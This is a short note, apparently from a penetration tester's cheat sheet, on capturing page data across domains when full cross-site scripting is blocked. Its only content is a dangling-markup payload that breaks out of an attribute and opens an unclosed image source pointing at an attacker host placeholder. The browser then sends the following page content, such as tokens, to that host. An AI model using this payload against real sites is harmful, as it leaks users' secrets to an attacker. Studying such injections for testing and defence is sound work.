### Capture data cross-domain where full xss is not possible
```
payload does not close the src attribute
parsing of response will treat everything as part of the URL until another quotation mark is encountered
"><img src='//<lhost>/ 
```

